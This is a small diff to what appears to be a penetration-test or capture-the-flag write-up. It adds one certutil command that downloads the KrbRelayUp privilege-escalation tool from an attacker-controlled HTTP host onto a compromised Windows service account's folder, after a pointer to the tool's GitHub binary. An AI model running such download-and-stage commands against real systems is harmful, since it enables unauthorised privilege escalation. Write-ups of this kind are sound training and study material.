@@ -412,5 +412,7 @@ First ill grab `krbrelayup` from github
 
 https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/KrbRelayUp.exe
 
-
+```python
+certutil -urlcache -split -f http:///KrbRelayUp.exe C:\Users\svc_scan\Documents\KrbRelayUp.exe
+```
 
